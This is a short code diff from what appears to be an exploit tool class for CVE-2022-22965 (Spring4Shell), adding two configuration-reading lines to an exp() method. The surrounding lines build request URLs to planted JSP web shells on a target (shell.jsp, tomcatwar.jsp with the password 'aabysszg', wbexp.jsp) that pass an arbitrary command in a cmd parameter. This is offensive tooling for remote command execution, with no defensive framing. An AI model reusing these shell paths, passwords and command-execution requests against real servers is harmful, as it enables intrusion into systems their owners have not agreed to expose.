@@ -137,6 +137,8 @@ class CVE_2022_22965:
             error = f"[error] {url} 未知错误 {e}"
             return error
     def exp(self, url, proxies, ProxyStute,cmd):
+        self.expTypeGet = self.configRead.VulnsConfigRead()
+        self.expType = self.expTypeGet["expType"]
         shell1 = url + f"shell.jsp?cmd={cmd}"
         shell2 = url + f"tomcatwar.jsp?pwd=aabysszg&cmd={cmd}"
         shell3 = url + f"wbexp.jsp?pwd=13exp&cmd={cmd}"
